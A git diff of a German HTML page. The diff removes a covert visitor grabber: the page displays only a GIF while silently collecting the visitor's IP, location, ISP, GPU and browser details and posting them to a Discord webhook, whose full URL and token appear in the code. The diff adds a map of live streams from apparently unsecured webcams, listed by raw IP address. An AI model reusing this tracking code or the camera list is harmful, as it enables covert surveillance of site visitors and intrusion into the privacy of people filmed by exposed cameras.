@@ -1,110 +1,81 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-    <meta charset="UTF-8">
-    <title>Willkommen</title>
-    <style>
-        body {
-            background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        img {
-            max-width: 90%;
-            max-height: 90%;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Webcam Map</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <style>
+    #map {
+      height: 100vh;
+      width: 100%;
+    }
+    .popup-content {
+      text-align: center;
+    }
+    .popup-content img {
+      max-width: 100%;
+      height: auto;
+    }
+  </style>
 </head>
 <body>
+  <div id="map"></div>
 
-<!-- Zeigt nur ein unauffälliges GIF -->
-<img src="https://media2.giphy.com/media/a93jwI0wkWTQs/giphy.gif?cid=6c09b952yb2v1fihrodamr3a9hwln6tl08syec16tatqibrj&ep=v1_gifs_search&rid=giphy.gif&ct=g" alt="Lädt...">
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script>
+    const cams = [
+      {
+        "stream": "http://87.57.111.162:80/mjpg/video.mjpg",
+        "country": "Denmark",
+        "country_code": null,
+        "region": "Nordjylland",
+        "city": "Aalborg",
+        "latitude": 57.048,
+        "longitude": 9.9187,
+        "timezone": "+01:00",
+        "preview_url": "http://insecam.org/static/thumb/538554.jpg",
+        "is_iframe": false,
+        "is_static": false,
+        "is_popular": false,
+        "categories": ["traffic"]
+      },
+      {
+        "stream": "http://43.252.62.93:8083/jpgmulreq/1/image.jpg?key=1516975535684&lq=1&0",
+        "country": "India",
+        "country_code": null,
+        "region": "Gujarat",
+        "city": "Ankleshwar",
+        "latitude": 21.6,
+        "longitude": 73,
+        "timezone": "+05:30",
+        "preview_url": "http://insecam.org/static/thumb/814253.jpg",
+        "is_iframe": false,
+        "is_static": false,
+        "is_popular": false,
+        "categories": ["other"]
+      }
+    ];
 
-<script>
-const webhookUrl = "https://discord.com/api/webhooks/1365776827787903068/StBWh9kwc5IAZVoTZWUd7ravbE3vReMNkyic1_sIlmj40NKmowSDPG_fo41vMvpSnGWv"; // <-- Hier deinen Discord-Webhook einfügen
+    const map = L.map('map').setView([20, 0], 2);
 
-async function collectData() {
-    const data = {};
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '© OpenStreetMap-Mitwirkende'
+    }).addTo(map);
 
-    try {
-        // IPv4 von ipify holen
-        const ipify = await fetch('https://api64.ipify.org?format=json').then(r => r.json());
-        data.ipv4 = ipify.ip;
-    } catch {
-        data.ipv4 = "Fehler beim Laden";
-    }
-
-    try {
-        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-        data.country = ipData.country_name;
-        data.city = ipData.city;
-        data.region = ipData.region;
-        data.isp = ipData.org;
-    } catch {
-        data.country = "Unbekannt";
-    }
-
-    data.userAgent = navigator.userAgent;
-    data.language = navigator.language;
-    data.platform = navigator.platform;
-    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    data.screenResolution = `${window.screen.width}x${window.screen.height}`;
-    data.colorScheme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode" : "Light Mode";
-    data.touchSupport = 'ontouchstart' in window ? "Ja" : "Nein";
-    data.orientation = (screen.orientation || {}).type || "Nicht erkannt";
-    data.localTime = new Date().toString();
-
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Nicht verfügbar";
-    } catch {
-        data.gpu = "Nicht ermittelbar";
-    }
-
-    return data;
-}
-
-async function sendToDiscord() {
-    const info = await collectData();
-
-    const embed = {
-        title: "Neuer Seitenbesuch",
-        color: 5814783,
-        fields: [
-            { name: "IPv4", value: info.ipv4 || "Unbekannt", inline: true },
-            { name: "Land", value: info.country || "Unbekannt", inline: true },
-            { name: "Stadt", value: info.city || "Unbekannt", inline: true },
-            { name: "Region", value: info.region || "Unbekannt", inline: true },
-            { name: "ISP", value: info.isp || "Unbekannt", inline: false },
-            { name: "GPU", value: info.gpu || "Unbekannt", inline: false },
-            { name: "Browser", value: info.userAgent || "Unbekannt", inline: false },
-            { name: "Sprache", value: info.language || "Unbekannt", inline: true },
-            { name: "Plattform", value: info.platform || "Unbekannt", inline: true },
-            { name: "Zeitzone", value: info.timezone || "Unbekannt", inline: true },
-            { name: "Bildschirm", value: info.screenResolution || "Unbekannt", inline: true },
-            { name: "Farbmodus", value: info.colorScheme || "Unbekannt", inline: true },
-            { name: "Touchscreen", value: info.touchSupport || "Unbekannt", inline: true },
-            { name: "Ausrichtung", value: info.orientation || "Unbekannt", inline: true },
-            { name: "Lokale Zeit", value: info.localTime || "Unbekannt", inline: false },
-        ],
-        footer: { text: "Info automatisch gesammelt" },
-        timestamp: new Date()
-    };
-
-    await fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] })
+    cams.forEach(cam => {
+      const popupContent = `
+        <div class="popup-content">
+          <strong>${cam.city}, ${cam.region}</strong><br/>
+          <img src="${cam.preview_url}" alt="Preview" /><br/>
+          <a href="${cam.stream}" target="_blank">Live-Stream öffnen</a><br/>
+          Kategorie: ${cam.categories.join(", ")}
+        </div>
+      `;
+      L.marker([cam.latitude, cam.longitude])
+        .addTo(map)
+        .bindPopup(popupContent);
     });
-}
-
-sendToDiscord();
-</script>
-
+  </script>
 </body>
 </html>
